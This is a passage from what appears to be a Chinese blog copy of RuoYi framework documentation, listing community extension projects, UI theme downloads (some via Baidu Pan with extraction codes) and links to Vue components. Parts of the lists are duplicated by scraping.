<table><thead><tr><th>名称</th><th>说明</th><th>地址</th></tr></thead><tbody><tr><td>RuoYi-Vue</td><td>RuoYi前后端分离版本</td><td>https://github.com/yangzongzhuan/RuoYi-Vue</td></tr><tr><td>RuoYi-Cloud</td><td>RuoYi微服务版本</td><td>https://github.com/yangzongzhuan/RuoYi-Cloud</td></tr><tr><td>RuoYi-fast</td><td>RuoYi单应用版本</td><td>https://github.com/yangzongzhuan/RuoYi-fast</td></tr><tr><td>RuoYi-Oracle</td><td>RuoYi多模块Oracle版本</td><td>https://github.com/yangzongzhuan/RuoYi-Oracle</td></tr><tr><td>RuoYi-gzizi</td><td>RuoYi多模块SQLServer版本</td><td>https://gitee.com/Sxile/RuoYi-Sqlserver</td></tr><tr><td>RuoYi-zbbtest</td><td>RuoYi多模块PostgreSQL版本</td><td>https://gitee.com/zbbtest/Ruoyi-PostgreSQL</td></tr><tr><td>RuoYi-zhangmrit</td><td>集成通用Mapper OSS模块 JWT 多数据源切面</td><td>https://gitee.com/zhangmrit/RuoYi</td></tr><tr><td>RuoYi-cloud</td><td>集成SpringCloud，ant-design-vue、token、redis</td><td>https://gitee.com/zhangmrit/ruoyi-cloud</td></tr><tr><td>RuoYi-Process</td><td>集成Activiti 6.x工作流版本</td><td>https://gitee.com/calvinhwang123/RuoYi-Process</td></tr><tr><td>RuoYi-plus</td><td>集成SpringCloud，config配置中心，使用tk.mybatis、lombok</td><td>https://gitee.com/aimeng2017/RuoYi-plus/tree/master</td></tr><tr><td>RuoYi-cms</td><td>内容管理系统（包括博客+爬虫+管理后台）</td><td>https://gitee.com/markbro/ruoyi-plus</td></tr><tr><td>RuoYi-blog</td><td>基于RuoYi开发的博客系统</td><td>https://gitee.com/GiteeKey/ruoyi-blog</td></tr><tr><td>RuoYi-ZhiGeCms</td><td>内容管理系统（集成邮件,Redis,Solr,淘宝客等）</td><td>https://gitee.com/Getawy/zhige</td></tr><tr><td>RuoYi-liuwy</td><td>内容管理系统（集成Activiti5,文件管理器等）</td><td>https://gitee.com/liuwy_dlsdys/zhglxt</td></tr><tr><td>RuoYi-wms</td><td>deer-wms自动化立体仓库原料库系统</td><td>https://gitee.com/GuoJingXun/deer-wms-2</td></tr><tr><td>RuoYi-house</td><td>基于RuoYi+uniapp开发的租赁平台</td><td>https://gitee.com/cookieBoy/house</td></tr><tr><td>RuoYi-windpower</td><td>基于RuoYi风电场监控项目</td><td>https://gitee.com/zhangweijrdhcc/windpower</td></tr><tr><td>RuoYi-erp</td><td>基于RuoYi进销存管理系统</td><td>https://gitee.com/tanzhi/hxERP</td></tr><tr><td>RuoYi-radius</td><td>基于RuoYi路由WIFI认证框架</td><td>https://gitee.com/panweilei/ruoyi-radius</td></tr><tr><td>RuoYi-comic</td><td>漫画网站响应式 集成redis+七牛云存储图片</td><td>https://gitee.com/far-east-bureau/comic</td></tr><tr><td>RuoYi-seagull</td><td>测试平台系统（接口自动化、WEB UI自动化、APP自动化）</td><td>https://gitee.com/seagull1985/LuckyFrameWeb</td></tr><tr><td>RuoYi-HtxkEmsm</td><td>高校教学综合平台</td><td>https://github.com/hongmaple/HtxkEmsm</td></tr><tr><td>RuoYi-hp</td><td>教学教务管理系统</td><td>https://gitee.com/wang2834557/hp-jx</td></tr><tr><td>RuoYi-snow</td><td>集成钉钉与flowable（一体化人事流程系统）</td><td>https://gitee.com/qimingjin/snow</td></tr><tr><td>RuoYi-badcat</td><td>集成MybatisPlus与Activiti+Bpmnjs、表单编辑器</td><td>https://gitee.com/study_badcat/ry_mp_activiti</td></tr><tr><td>RuoYi-EasyUI</td><td>集成EasyUI前端</td><td>https://gitee.com/yanxiuhair/yanxiuhair</td></tr><tr><td>RuoYi-zhaojin</td><td>jfinal版本（mysql/oralce）</td><td>https://gitee.com/RemoteControl/BB</td></tr><tr><td>RuoYi-Net</td><td>基于RuoYi开发.Net语言版本</td><td>https://github.com/liukuo362573/YiShaAdmin</td></tr><tr><td>RuoYi-Net-Cms</td><td>基于RuoYi开发.Net语言Cms版本</td><td>https://github.com/aprilyush/EasyCMS</td></tr><tr><td>RuoYi-Go</td><td>基于RuoYi开发Go语言版本</td><td>https://gitee.com/yunjieg/yjgo</td></tr><tr><td>RuoYi-Go</td><td>基于RuoYi开发Go语言版本</td><td>https://gitee.com/lostad/ruoyi-go</td></tr><tr><td>RuoYi-laravel</td><td>基于RuoYi开发laravel语言版本</td><td>https://gitee.com/b5net/b5-laravel-cmf</td></tr><tr><td>RuoYi-ES</td><td>集成ElasticSearch搜索引擎、RabbitMQ消息中间件</td><td>https://gitee.com/J-LJJ/RuoYi-ES</td></tr><tr><td>RuoYi-JFlow</td><td>JFlow工作流项目集成案例_Java开源项目 RuoYi v4.1.0</td><td>https://gitee.com/kikock/RuoYi-JFlow</td></tr><tr><td>RuoYi-db2</td><td>集成db2数据库</td><td>https://gitee.com/liao_ru_qi/rouyi-db2</td></tr><tr><td>RuoYi-yangzhengze</td><td>集成activiti工作流</td><td>https://gitee.com/yangzhengze/RuoYi/tree/dev2</td></tr><tr><td>RuoYi-kbsmdd</td><td>集成微信扫码点餐系统</td><td>https://gitee.com/china-bin/RuoYi-kbsmdd</td></tr><tr><td>RuoYi-media</td><td>基于RuoYi开发媒资管理系统</td><td>https://gitee.com/trs_sjz/zy-media</td></tr><tr><td>RuoYi-davidzhe</td><td>集成微信小程序（婚礼邀请函）</td><td>https://gitee.com/davidzhe/wedding-invitation-</td></tr><tr><td>RuoYi-NutzSite</td><td>集成CMS、支付宝、微信公众平台、阿里云、高德、七牛云</td><td>https://gitee.com/TomYule/NutzSite.git</td></tr><tr><td>RuoYi-silence</td><td>集成了lombok和微信公众号开发的基础框架</td><td>https://github.com/Thinkingcao/silence-boot</td></tr><tr><td>RuoYi-RxJob</td><td>集成任务调度平台xxl-job支持多用户、多项目组管理</td><td>https://gitee.com/haohandongku/RxJob</td></tr><tr><td>RuoYi-NTL</td><td>主键改为UUID。同时支持Mysql、Oracle多种数据源</td><td>https://gitee.com/NTL-life/ruoyi</td></tr><tr><td>RuoYi-dongcs</td><td>集成了keycloak sso功能</td><td>https://gitee.com/dongcs0126/RuoYi</td></tr><tr><td>RuoYi-okr</td><td>实现了okr功能</td><td>https://gitee.com/cierqiu/royi_okr</td></tr><tr><td>RuoYi-lwslws</td><td>增加Mina 用户和部门导入 定时备份mysql数据库 邮件发送</td><td>https://gitee.com/lwslws/ry_New</td></tr><tr><td>RuoYi-baha</td><td>RuoYi单应用Oracle版本</td><td>https://gitee.com/baha/RuoYi-fast-Oracle</td></tr><tr><td>RuoYi-duzunwu512</td><td>Redis实现Session共享多模块（支持Cacheable缓存）</td><td>https://gitee.com/duzunwu512/RuoYi</td></tr><tr><td>RuoYi-panda</td><td>集成redis-shiro 百度对象存储 JWT openApi 无xml注解</td><td>https://gitee.com/happy-panda/RuoYi</td></tr><tr><td>RuoYi-rycodes</td><td>去除mybatis修改成Spring JDBCTemplate</td><td>https://gitee.com/rycodes/ruoyi</td></tr><tr><td>RuoYi-crown</td><td>将maven改造为gradle、mybatis更换为mybatis puls</td><td>https://github.com/Caratacus/Crown</td></tr><tr><td>RuoYi-dameng</td><td>集成达梦数据库</td><td>https://gitee.com/freetalent/ruoyi-dameng</td></tr><tr><td>RuoYi-kingbase</td><td>集成人大金仓数据库</td><td>https://gitee.com/linux-user/ruoyi-kingbase</td></tr><tr><td>RuoYi-sqlite</td><td>集成sqlite数据库</td><td>https://gitee.com/shuizhimeng/ruo-yi-fast-sqlite</td></tr><tr><td>RuoYi-beetlsql</td><td>beetlsql版本</td><td>https://gitee.com/iehyou/ruoyi-beetlsql</td></tr><tr><td>RuoYi-iterking</td><td>模板引擎改为Beetl</td><td>https://gitee.com/tanba/RuoYi-Beetl</td></tr><tr><td>RuoYi-rocketmq</td><td>集成rocketmq控制台</td><td>https://github.com/472732787/RuoYi/tree/ruoyi-rocketmq</td></tr><tr><td>RuoYi-cas</td><td>集成了cas5.3</td><td>https://gitee.com/liupsh/ruoyi-cas</td></tr><tr><td>RuoYi-gradle</td><td>将maven改造为gradle管理项目</td><td>https://gitee.com/cacoota/RuoYi</td></tr><tr><td>RuoYi-saas</td><td>增加mybatis-plus、扩展为SAAS平台，支持多租户管理</td><td>https://gitee.com/jinzheyi/yubb-saas</td></tr><tr><td>RuoYi-saas</td><td>增加消息中间件、扩展为SAAS平台，支持多租户管理</td><td>https://gitee.com/zhangqiangBUG/hello-ruoyi-saas</td></tr><tr><td>RuoYi-shiro-redis</td><td>集成shiro-redis实现Redis集群会话管理（提取码：9cy7）</td><td>https://pan.baidu.com/s/14fcCNqHlFTrJlH05s0P8uA</td></tr><tr><td>RuoYi-sharding-jdbc</td><td>集成sharding-jdbc实现分库分表（提取码：yapx）</td><td>https://pan.baidu.com/s/1qT__oI3oLfI77Dnj76-iIQ</td></tr><tr><td>RuoYi-JustAuth</td><td>集成JustAuth实现第三方授权登录（提取码：yyxi）</td><td>https://pan.baidu.com/s/1hl_VCJpxG5jFU2lNMG08Yw</td></tr><tr><td>RuoYi-jwt</td><td>集成Jwt实现权限登录授权访问（提取码：dss9）</td><td>https://pan.baidu.com/s/1PCUqenL2JhAR2dIKtCwD1Q</td></tr><tr><td>RuoYi-app-jwt</td><td>集成jwt单独模块认证授权访问（提取码：4syh）</td><td>https://pan.baidu.com/s/1_n6UTVOuqXgJ8JM7QkGzZQ</td></tr><tr><td>RuoYi-app-redis</td><td>集成redis实现权限登录授权访问（提取码：5bp9）</td><td>https://pan.baidu.com/s/1Q3ohzYDMi9TT0W1f3Qw8RQ</td></tr><tr><td>RuoYi-aj-captcha</td><td>集成了aj-captcha登录注册滑块验证（提取码：iki2）</td><td>https://pan.baidu.com/s/14L6gW2g8iUV9yUAe9OHkJQ</td></tr><tr><td>RuoYi-atomikos</td><td>多模块分布式事务atomikos-mysql+mysql（提取码：5juq）</td><td>https://pan.baidu.com/s/1CXXebEIOB1rY5_gLxZat6A</td></tr><tr><td>RuoYi-mybatisplus</td><td>集成mybatisplus实现mybatis增强（提取码：r4ve）</td><td>https://pan.baidu.com/s/1y0qNjJUzelxG2MD4vHaWfA</td></tr><tr><td>RuoYi-fast-atomikos</td><td>单应用分布式事务atomikos-mysql+oracle（提取码：cq6a）</td><td>https://pan.baidu.com/s/1s290OyoCcZlBzwlGrMRJdQ</td></tr><tr><td>RuoYi-fast-atomikos</td><td>单应用分布式事务atomikos-mysql+sqlserver</td><td>https://gitee.com/oldx/ruo-yi-fast</td></tr><tr><td>RuoYi-jsencrypt</td><td>集成jsencrypt实现密码加密传输方式（提取码：qmxi）</td><td>https://pan.baidu.com/s/1p5CGTI74sfklX0K-XMy9gw</td></tr><tr><td>RuoYi-ueditor</td><td>集成ueditor实现富文本编辑器增强（提取码：qiuf）</td><td>https://pan.baidu.com/s/1uXYkWLyLrlbA7vxv-u8iDw</td></tr><tr><td>RuoYi-cas</td><td>集成cas实现单点登录认证（提取码：jwf8）</td><td>https://pan.baidu.com/s/1s4POHLLqtus15IzVoLhF2A</td></tr><tr><td>RuoYi-quyj</td><td>Mybatis-Plus多模块，基于RuoYi4.0进行修改</td><td>https://gitee.com/clazz/Ruoyi4.0</td></tr><tr><td>RuoYi-theodo</td><td>Mybatis-Plus多模块，基于RuoYi4.0进行修改</td><td>https://gitee.com/theodo/jeefast2.0</td></tr><tr><td>RuoYi-sushengbuyu</td><td>Mybatis-Plus多模块 Lombok插件（支持代码生成）</td><td>https://gitee.com/sushengbuyu/RuoYi</td></tr><tr><td>RuoYi-fast-mybatis-plus</td><td>Mybatis-Plus单应用（支持代码生成）</td><td>https://gitee.com/easy__/RuoYi-fast.git</td></tr><tr><td>RuoYi-depending-mp</td><td>Mybatis-Plus多模块（支持代码生成）</td><td>https://gitee.com/dotstable/depending_on_the_framework</td></tr><tr><td>RuoYi-sky</td><td>安全框架Shiro更换为Spring Secutity</td><td>https://gitee.com/qiu-qian/sky</td></tr><tr><td>RuoYi-file</td><td>新增文件上传修改预览（提取码：cs12）</td><td>https://pan.baidu.com/s/1wl0zCMvY6C4R3vRnYAJqgQ</td></tr><tr><td>RuoYi-yuejiu</td><td>动态数据源(从数据中查询并动态创建数据源)</td><td>https://gitee.com/yuejiu/RuoYi</td></tr><tr><td>RuoYi-yiran</td><td>集成支付、订单、对账、清算、账户管理等功能</td><td>https://github.com/lsl08/yiran</td></tr><tr><td>RuoYi-zouyi</td><td>Redis实现Session共享单应用（提取码：erft）</td><td>https://pan.baidu.com/s/13QFqhcLRIpQhnhRivAgomg</td></tr><tr><td>RuoYi-3.1-activiti</td><td>RuoYi多模块工作流版本</td><td>https://pan.baidu.com/s/1Omj6GSB7j4xY6H_nfiNHPA</td></tr><tr><td>RuoYi-mybatis-plus</td><td>Mybatis-Plus多模块（支持代码生成）</td><td>https://pan.baidu.com/s/17ZrAuqJMuGkkSwjkNvVHsA</td></tr><tr><td>RuoYi-3.2-redis</td><td>RuoYi多模块Redis实现Session的共享（提取码：rz7c）</td><td>https://pan.baidu.com/s/1tPRlL3dLy82qWDYFps4cwg</td></tr><tr><td>RuoYi-qiqiim</td><td>RuoYi-fast 与qiqiim layim 的整合项目</td><td>https://gitee.com/wenhaofan/RuoYi-qiqiim</td></tr><tr><td>RuoYi-layui</td><td>集成layui主题、MybatisPlus、代码生成改造</td><td>https://github.com/kongshanxuelin/ruoyiplus</td></tr><tr><td>RuoYi-chenzz</td><td>Layui版本的RuoYi管理系统</td><td>https://gitee.com/chenzz/RuoYi-fast/tree/ver-layui</td></tr><tr><td>RuoYi-flying</td><td>Layui版本的RuoYi管理系统</td><td>https://gitee.com/flying_stars/ruoyi-layui</td></tr><tr><td>RuoYi-shop</td><td>供货商城系统（包括小程序+API+管理后台）</td><td>https://gitee.com/guchengwuyue/supplierShop</td></tr><tr><td>RuoYi-zhangmrit</td><td>归属地整合纯真、百度、离线文件ip2region</td><td>https://gitee.com/zhangmrit/ruoyi-ip2region</td></tr><tr><td>RuoYi-print</td><td>集成Lodop打印插件，实现自定义打印模板</td><td>https://gitee.com/xgqx89/ruoyi-print</td></tr><tr><td>RuoYi-code-generator</td><td>若依独立代码生成工具，无需依赖服务器</td><td>https://gitee.com/lpf_project/code-generator</td></tr><tr><td>RuoYi-common-tools</td><td>若依框架包名修改器</td><td>https://gitee.com/lpf_project/common-tools</td></tr></tbody></table>
<h2><a id="2_7977"></a>2、<strong>前台扩展</strong></h2>
<table><thead><tr><th>名称</th><th>说明</th><th>地址</th></tr></thead><tbody><tr><td>Hplus</td><td>Hplus（4.1.0后台主题UI框架）</td><td>https://pan.baidu.com/s/1cpDPD39OjF7IVSmPrmE_oA</td></tr><tr><td>inspinia</td><td>inspinia（2.7.1后台主题UI框架汉化版）</td><td>https://pan.baidu.com/s/1KI4UPf0DFRs0dZW49-05fQ （提取码: nmju）</td></tr><tr><td>inspinia</td><td>inspinia（2.8后台主题bootstrap4.1）</td><td>https://pan.baidu.com/s/1wUR7GmjEfe8NsQJ5geaQbw</td></tr><tr><td>Distpicker</td><td>Distpicker（v2.0.4省市联动三级下拉框）</td><td>https://pan.baidu.com/s/1kGCWkUx7nsikcKt8oXj4gQ</td></tr></tbody></table>
<h1><a id="_7986"></a>二十五、组件文档</h1>
<p>系统使用到的相关组件</p>
<h2><a id="httpdocruoyivipruoyivuedocumentzjwdhtml_7990"></a><a href="http://doc.ruoyi.vip/ruoyi-vue/document/zjwd.html#%E5%9F%BA%E7%A1%80%E6%A1%86%E6%9E%B6%E7%BB%84%E4%BB%B6">#</a>基础框架组件</h2>
<p><a href="https://github.com/ElemeFE/element">element-ui(opens new window)</a></p>
<p><a href="https://github.com/PanJiaChen/vue-element-admin">vue-element-admin(opens new window)</a></p>
<h2><a id="httpdocruoyivipruoyivuedocumentzjwdhtml_7996"></a><a href="http://doc.ruoyi.vip/ruoyi-vue/document/zjwd.html#%E6%A0%91%E5%BD%A2%E9%80%89%E6%8B%A9%E7%BB%84%E4%BB%B6">#</a>树形选择组件</h2>
<p><a href="https://github.com/riophae/vue-treeselect">vue-treeselect(opens new window)</a></p>
<h2><a id="httpdocruoyivipruoyivuedocumentzjwdhtml_8000"></a><a href="http://doc.ruoyi.vip/ruoyi-vue/document/zjwd.html#%E5%AF%8C%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91%E5%99%A8">#</a>富文本编辑器</h2>
<p><a href="https://github.com/quilljs/quill">quill(opens new window)</a></p>
<h2><a id="httpdocruoyivipruoyivuedocumentzjwdhtml_8004"></a><a href="http://doc.ruoyi.vip/ruoyi-vue/document/zjwd.html#%E8%A1%A8%E6%A0%BC%E5%88%86%E9%A1%B5%E7%BB%84%E4%BB%B6">#</a>表格分页组件</h2>
<p><a href="https://gitee.com/y_project/RuoYi-Vue/blob/master/ruoyi-ui/src/components/Pagination/index.vue">pagination(opens new window)</a></p>
<h2><a id="httpdocruoyivipruoyivuedocumentzjwdhtml_8008"></a><a href="http://doc.ruoyi.vip/ruoyi-vue/document/zjwd.html#%E5%AF%8C%E6%96%87%E6%9C%AC%E7%BB%84%E4%BB%B6">#</a>富文本组件</h2>
<p><a href="https://gitee.com/y_project/RuoYi-Vue/blob/master/ruoyi-ui/src/components/Editor/index.vue">editor(opens new window)</a></p>
<h2><a id="httpdocruoyivipruoyivuedocumentzjwdhtml_8012"></a><a href="http://doc.ruoyi.vip/ruoyi-vue/document/zjwd.html#%E5%B7%A5%E5%85%B7%E6%A0%8F%E5%8F%B3%E4%BE%A7%E7%BB%84%E4%BB%B6">#</a>工具栏右侧组件</h2>
<p><a href="https://gitee.com/y_project/RuoYi-Vue/blob/master/ruoyi-ui/src/components/RightToolbar/index.vue">right-toolbar(opens new window)</a></p>
<h2><a id="httpdocruoyivipruoyivuedocumentzjwdhtml_8016"></a><a href="http://doc.ruoyi.vip/ruoyi-vue/document/zjwd.html#%E5%9B%BE%E7%89%87%E4%B8%8A%E4%BC%A0%E7%BB%84%E4%BB%B6">#</a>图片上传组件</h2>
<p><a href="https://gitee.com/y_project/RuoYi-Vue/tree/master/ruoyi-ui/src/components/ImageUpload">image-upload(opens new window)</a></p>
<h2><a id="httpdocruoyivipruoyivuedocumentzjwdhtml_8020"></a><a href="http://doc.ruoyi.vip/ruoyi-vue/document/zjwd.html#%E5%9B%BE%E7%89%87%E9%A2%84%E8%A7%88%E7%BB%84%E4%BB%B6">#</a>图片预览组件</h2>
<p><a href="https://gitee.com/y_project/RuoYi-Vue/tree/master/ruoyi-ui/src/components/ImagePreview">image-preview(opens new window)</a></p>
<h2><a id="httpdocruoyivipruoyivuedocumentzjwdhtml_8024"></a><a href="http://doc.ruoyi.vip/ruoyi-vue/document/zjwd.html#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%84%E4%BB%B6">#</a>文件上传组件</h2>
<p><a href="https://gitee.com/y_project/RuoYi-Vue/tree/master/ruoyi-ui/src/components/FileUpload">file-upload(opens new window)</a></p>
<h2><a id="httpdocruoyivipruoyivuedocumentzjwdhtml_8028"></a><a href="http://doc.ruoyi.vip/ruoyi-vue/document/zjwd.html#%E8%A1%A8%E5%8D%95%E8%AE%BE%E8%AE%A1%E7%BB%84%E4%BB%B6">#</a>表单设计组件</h2>
<p><a href="https://github.com/JakHuang/form-generator">form-generator(opens new window)</a></p>
<h2><a id="httpdocruoyivipruoyivuedocumentzjwdhtml_8032"></a><a href="http://doc.ruoyi.vip/ruoyi-vue/document/zjwd.html#%E6%95%B0%E6%8D%AE%E5%AD%97%E5%85%B8%E7%BB%84%E4%BB%B6">#</a>数据字典组件</h2>
<p><a href="https://github.com/moxun1639/vue-data-dict">vue-data-dict(opens new window)</a></p>
<h2><a id="httpdocruoyivipruoyivuedocumentzjwdhtml_8036"></a><a href="http://doc.ruoyi.vip/ruoyi-vue/document/zjwd.html#%E4%BB%BB%E5%8A%A1%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%BB%84%E4%BB%B6">#</a>任务表达式组件</h2>
<p><a href="https://github.com/small-stone/vCrontab">vue-crontab(opens new window)</a><br/> .com/liupsh/ruoyi-cas |<br/> | RuoYi-gradle | 将maven改造为gradle管理项目 | https://gitee.com/cacoota/RuoYi |<br/> | RuoYi-saas | 增加mybatis-plus、扩展为SAAS平台，支持多租户管理 | https://gitee.com/jinzheyi/yubb-saas |<br/> | RuoYi-saas | 增加消息中间件、扩展为SAAS平台，支持多租户管理 | https://gitee.com/zhangqiangBUG/hello-ruoyi-saas |<br/> | RuoYi-shiro-redis | 集成shiro-redis实现Redis集群会话管理（提取码：9cy7） | https://pan.baidu.com/s/14fcCNqHlFTrJlH05s0P8uA |<br/> | RuoYi-sharding-jdbc | 集成sharding-jdbc实现分库分表（提取码：yapx） | https://pan.baidu.com/s/1qT__oI3oLfI77Dnj76-iIQ |<br/> | RuoYi-JustAuth | 集成JustAuth实现第三方授权登录（提取码：yyxi） | https://pan.baidu.com/s/1hl_VCJpxG5jFU2lNMG08Yw |<br/> | RuoYi-jwt | 集成Jwt实现权限登录授权访问（提取码：dss9） | https://pan.baidu.com/s/1PCUqenL2JhAR2dIKtCwD1Q |<br/> | RuoYi-app-jwt | 集成jwt单独模块认证授权访问（提取码：4syh） | https://pan.baidu.com/s/1_n6UTVOuqXgJ8JM7QkGzZQ |<br/> | RuoYi-app-redis | 集成redis实现权限登录授权访问（提取码：5bp9） | https://pan.baidu.com/s/1Q3ohzYDMi9TT0W1f3Qw8RQ |<br/> | RuoYi-aj-captcha | 集成了aj-captcha登录注册滑块验证（提取码：iki2） | https://pan.baidu.com/s/14L6gW2g8iUV9yUAe9OHkJQ |<br/> | RuoYi-atomikos | 多模块分布式事务atomikos-mysql+mysql（提取码：5juq） | https://pan.baidu.com/s/1CXXebEIOB1rY5_gLxZat6A |<br/> | RuoYi-mybatisplus | 集成mybatisplus实现mybatis增强（提取码：r4ve） | https://pan.baidu.com/s/1y0qNjJUzelxG2MD4vHaWfA |<br/> | RuoYi-fast-atomikos | 单应用分布式事务atomikos-mysql+oracle（提取码：cq6a） | https://pan.baidu.com/s/1s290OyoCcZlBzwlGrMRJdQ |<br/> | RuoYi-fast-atomikos | 单应用分布式事务atomikos-mysql+sqlserver | https://gitee.com/oldx/ruo-yi-fast |<br/> | RuoYi-jsencrypt | 集成jsencrypt实现密码加密传输方式（提取码：qmxi） | https://pan.baidu.com/s/1p5CGTI74sfklX0K-XMy9gw |<br/> | RuoYi-ueditor | 集成ueditor实现富文本编辑器增强（提取码：qiuf） | https://pan.baidu.com/s/1uXYkWLyLrlbA7vxv-u8iDw |<br/> | RuoYi-cas | 集成cas实现单点登录认证（提取码：jwf8） | https://pan.baidu.com/s/1s4POHLLqtus15IzVoLhF2A |<br/> | RuoYi-quyj | Mybatis-Plus多模块，基于RuoYi4.0进行修改 | https://gitee.com/clazz/Ruoyi4.0 |<br/> | RuoYi-theodo | Mybatis-Plus多模块，基于RuoYi4.0进行修改 | https://gitee.com/theodo/jeefast2.0 |<br/> | RuoYi-sushengbuyu | Mybatis-Plus多模块 Lombok插件（支持代码生成） | https://gitee.com/sushengbuyu/RuoYi |<br/> | RuoYi-fast-mybatis-plus | Mybatis-Plus单应用（支持代码生成） | https://gitee.com/easy__/RuoYi-fast.git |<br/> | RuoYi-depending-mp | Mybatis-Plus多模块（支持代码生成） | https://gitee.com/dotstable/depending_on_the_framework |<br/> | RuoYi-sky | 安全框架Shiro更换为Spring Secutity | https://gitee.com/qiu-qian/sky |<br/> | RuoYi-file | 新增文件上传修改预览（提取码：cs12） | https://pan.baidu.com/s/1wl0zCMvY6C4R3vRnYAJqgQ |<br/> | RuoYi-yuejiu | 动态数据源(从数据中查询并动态创建数据源) | https://gitee.com/yuejiu/RuoYi |<br/> | RuoYi-yiran | 集成支付、订单、对账、清算、账户管理等功能 | https://github.com/lsl08/yiran |<br/> | RuoYi-zouyi | Redis实现Session共享单应用（提取码：erft） | https://pan.baidu.com/s/13QFqhcLRIpQhnhRivAgomg |<br/> | RuoYi-3.1-activiti | RuoYi多模块工作流版本 | https://pan.baidu.com/s/1Omj6GSB7j4xY6H_nfiNHPA |<br/> | RuoYi-mybatis-plus | Mybatis-Plus多模块（支持代码生成） | https://pan.baidu.com/s/17ZrAuqJMuGkkSwjkNvVHsA |<br/> | RuoYi-3.2-redis | RuoYi多模块Redis实现Session的共享（提取码：rz7c） | https://pan.baidu.com/s/1tPRlL3dLy82qWDYFps4cwg |<br/> | RuoYi-qiqiim | RuoYi-fast 与qiqiim layim 的整合项目 | https://gitee.com/wenhaofan/RuoYi-qiqiim |<br/> | RuoYi-layui | 集成layui主题、MybatisPlus、代码生成改造 | https://github.com/kongshanxuelin/ruoyiplus |<br/> | RuoYi-chenzz | Layui版本的RuoYi管理系统 | https://gitee.com/chenzz/RuoYi-fast/tree/ver-layui |<br/> | RuoYi-flying | Layui版本的RuoYi管理系统 | https://gitee.com/flying_stars/ruoyi-layui |<br/> | RuoYi-shop | 供货商城系统（包括小程序+API+管理后台） | https://gitee.com/guchengwuyue/supplierShop |<br/> | RuoYi-zhangmrit | 归属地整合纯真、百度、离线文件ip2region | https://gitee.com/zhangmrit/ruoyi-ip2region |<br/> | RuoYi-print | 集成Lodop打印插件，实现自定义打印模板 | https://gitee.com/xgqx89/ruoyi-print |<br/> | RuoYi-code-generator | 若依独立代码生成工具，无需依赖服务器 | https://gitee.com/lpf_project/code-generator |<br/> | RuoYi-common-tools | 若依框架包名修改器 | https://gitee.com/lpf_project/common-tools |</p>
<h2><a id="2_8080"></a>2、<strong>前台扩展</strong></h2>
<table><thead><tr><th>名称</th><th>说明</th><th>地址</th></tr></thead><tbody><tr><td>Hplus</td><td>Hplus（4.1.0后台主题UI框架）</td><td>https://pan.baidu.com/s/1cpDPD39OjF7IVSmPrmE_oA</td></tr><tr><td>inspinia</td><td>inspinia（2.7.1后台主题UI框架汉化版）</td><td>https://pan.baidu.com/s/1KI4UPf0DFRs0dZW49-05fQ （提取码: nmju）</td></tr><tr><td>inspinia</td><td>inspinia（2.8后台主题bootstrap4.1）</td><td>https://pan.baidu.com/s/1wUR7GmjEfe8NsQJ5geaQbw</td></tr><tr><td>Distpicker</td><td>Distpicker（v2.0.4省市联动三级下拉框）</td><td>https://pan.baidu.com/s/1kGCWkUx7nsikcKt8oXj4gQ</td></tr></tbody></table>
<h1><a id="_8089"></a>二十五、组件文档</h1>
<p>系统使用到的相关组件</p>
<h2><a id="_8093"></a>基础框架组件</h2>
<p><a href="https://github.com/ElemeFE/element">element-ui(opens new window)</a></p>
<p><a href="https://github.com/PanJiaChen/vue-element-admin">vue-element-admin(opens new window)</a></p>
<h2><a id="_8099"></a>树形选择组件</h2>
<p><a href="https://github.com/riophae/vue-treeselect">vue-treeselect(opens new window)</a></p>
<h2><a id="_8103"></a>富文本编辑器</h2>
<p><a href="https://github.com/quilljs/quill">quill(opens new window)</a></p>
<h2><a id="_8107"></a>表格分页组件</h2>
<p><a href="https://gitee.com/y_project/RuoYi-Vue/blob/master/ruoyi-ui/src/components/Pagination/index.vue">pagination(opens new window)</a></p>
<h2><a id="_8111"></a>富文本组件</h2>
<p><a href="https://gitee.com/y_project/RuoYi-Vue/blob/master/ruoyi-ui/src/components/Editor/index.vue">editor(opens new window)</a></p>
<h2><a id="_8115"></a>工具栏右侧组件</h2>
<p><a href="https://gitee.com/y_project/RuoYi-Vue/blob/master/ruoyi-ui/src/components/RightToolbar/index.vue">right-toolbar(opens new window)</a></p>
<h2><a id="_8119"></a>图片上传组件</h2>
<p><a href="https://gitee.com/y_project/RuoYi-Vue/tree/master/ruoyi-ui/src/components/ImageUpload">image-upload(opens new window)</a></p>
<h2><a id="_8123"></a>图片预览组件</h2>
<p><a href="https://gitee.com/y_project/RuoYi-Vue/tree/master/ruoyi-ui/src/components/ImagePreview">image-preview(opens new window)</a></p>
<h2><a id="_8127"></a>文件上传组件</h2>
<p><a href="https://gitee.com/y_project/RuoYi-Vue/tree/master/ruoyi-ui/src/components/FileUpload">file-upload(opens new window)</a></p>
<h2><a id="_8131"></a>表单设计组件</h2>
<p><a href="https://github.com/JakHuang/form-generator">form-generator(opens new window)</a></p>
<h2><a id="_8135"></a>数据字典组件</h2>
<p><a href="https://github.com/moxun1639/vue-data-dict">vue-data-dict(opens new window)</a></p>
<h2><a id="_8139"></a>任务表达式组件</h2>
<p><a href="https://github.com/small-stone/vCrontab">vue-crontab(opens new window)</a></p>
</div>
<link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css" rel="stylesheet"/>
<link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css" rel="stylesheet"/>
</div>